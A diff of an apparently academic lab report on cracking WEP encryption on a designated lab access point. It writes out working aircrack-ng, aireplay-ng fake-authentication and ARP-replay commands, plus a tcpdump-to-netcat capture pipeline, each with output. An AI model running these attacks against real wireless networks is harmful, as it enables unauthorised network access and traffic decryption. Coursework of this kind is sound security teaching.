@@ -1,10 +1,10 @@
 # Question 1: Cracking WEP
 
-## a)
+## a) Setup
 
 * Installing on nodes: `opkg install aircrack-ng`
 
-## b)
+## b) Pasive WEP attack using PTW
 
 * `iw wlan0 scan` output:
 
@@ -37,11 +37,11 @@ nc -l -p 8080 > "tcpdump_run01-$(date +%s).cap"
 
 ### PTW attack with `tcpudmp` on node6:
 
+We used tcpdump on node6 to capture packets, because `airodump-ng` makes the files locally and we couldnt find a way to forward them to stepping stone, which was needed because of lack of space on nodes. We then used the `aircrack-ng` suite on our local machines, because it wasn't installed on SteppingStone.
+
 #### First try:
 
 ###### Capture packets:
-
-We used tcpdump, because `airodump-ng` makes the files locally and we couldnt find a way to forward them to stepping stone, which was needed because of lack of space on nodes.
 
 ```
 tcpdump -i wlan1 -G 10800 -W 1 -w- -s 65535 ether src or dst 00:1b:b1:01:dc:b2 | nc 172.17.3.1 8080 &
@@ -340,3 +340,88 @@ Failed. Next try with 505000 IVs.
 ```
 
 After this, we used this key to decrypt the catpured data from first run (3hr capture time) to check whether there are ARP packets, needed for PTW attack. There were indeed ARP packets captured. Since the first run captured almost 3 million packets. second 300.000 packets and third 750.000 packets on the ESSID WirelessLab_WEP_Crack_Me, and all the papers state that PTW attack needs less than 100.000 packets to have a success rate of more than 95%, we conclude that we are unable to crack this WEP password using PTW attack, but we are unsure of the reasons for this. Korek method on the other hand worked on third and first pass (as stated, KoreK needs at least 700.000 packets for 50% success rate), whereas the second capture was unsuccessfull, probably because of too low packet count.
+
+
+## c) Active WEP attack using KoreK
+
+#### 0. Get our ath9k (monitor) interface MAC address:
+
+`ifconfig wlan1` output:
+ 
+```
+wlan1
+Link encap:UNSPEC  HWaddr A8-54-B2-71-D3-5D-D0-CA-00-00-00-00-00-00-00-00
+	UP BROADCAST NOTRAILERS RUNNING PROMISC ALLMULTI  MTU:1500  Metric:1
+	RX packets:44435804 errors:0 dropped:0 overruns:0 frame:0
+	TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+	collisions:0 txqueuelen:1000 
+	bytes:26702657381 (24.8 GiB)  TX bytes:0 (0.0 B)
+```
+
+From which we get `A8-54-B2-71-D3-5D-D0`, or better `A8:54:B2:71:D3:5D` as our card MAC address.
+
+#### 1. Injection test: 
+
+`aireplay-ng -9 -e WirelessLab_WEP_Crack_Me -a 00:1b:b1:01:dc:b2 wlan1`
+
+Options:
+
+* `-9` : mean injection test
+* `-e WirelessLab_WEP_Crack_Me` : is the wireless network ESSID name
+* `-a 00:1b:b1:01:dc:b2` : is the access point MAC address
+* `wlan1` is the interface name
+
+Output:
+
+```
+13:50:38  Waiting for beacon frame (BSSID: 00:1B:B1:01:DC:B2) on channel 11
+13:50:38  Trying broadcast probe requests...
+13:50:38  Injection is working!
+13:50:40  Found 1 AP 
+
+13:50:40  Trying directed probe requests...
+13:50:40  00:1B:B1:01:DC:B2 - channel: 11 - 'WirelessLab_WEP_Crack_Me'
+13:50:47  Ping (min/avg/max): 7.349ms/7.349ms/7.349ms Power: -45.00
+13:50:47   1/30:   3%
+```
+
+#### 4. Start nc on SteppingStone
+
+`nc -l -p 8080 > "tcpdump_active_run01-$(date +%s).cap"`
+
+#### 3. start tcpdump on node6:
+
+`tcpdump -i wlan1 -c 1000000 -w- -s 65535 ether src or dst 00:1b:b1:01:dc:b2 | nc 172.17.3.1 8080 &`
+
+This has same options as above, with exception, that it will capture for 1.000.000 packets
+
+#### 4. Use aireplay-ng to do a fake authentication with the access point
+
+`aireplay-ng --fakeauth 0 -e WirelessLab_WEP_Crack_Me -a 00:1b:b1:01:dc:b2 -h A8:54:B2:71:D3:5D  wlan1`
+
+Options:
+
+* `--fakeauth 0` : fake authentication with AP, delay of 0 seconds
+* `-e WirelessLab_WEP_Crack_Me` : is the wireless network ESSID name
+* `-h A8:54:B2:71:D3:5D` : is our card MAC address
+* `wlan1` is the interface name
+
+Output:
+
+```
+14:19:46  Waiting for beacon frame (BSSID: 00:1B:B1:01:DC:B2) on channel 11
+
+14:19:46  Sending Authentication Request (Open System) [ACK]
+14:19:46  Authentication successful
+14:19:46  Sending Association Request [ACK]
+14:19:46  Association successful :-) (AID: 1)
+```
+
+#### 5. Start aireplay-ng in ARP request replay mode
+
+`aireplay-ng --arpreplay -b 00:1b:b1:01:dc:b2 -h A8:54:B2:71:D3:5D wlan1`
+
+* `--arpreplay` : standard ARP-request replay (ARP injection of received ARP request packets)
+* `-e WirelessLab_WEP_Crack_Me` : is the wireless network ESSID name
+* `-h A8:54:B2:71:D3:5D` : is our card MAC address
+* `wlan1` is the interface name
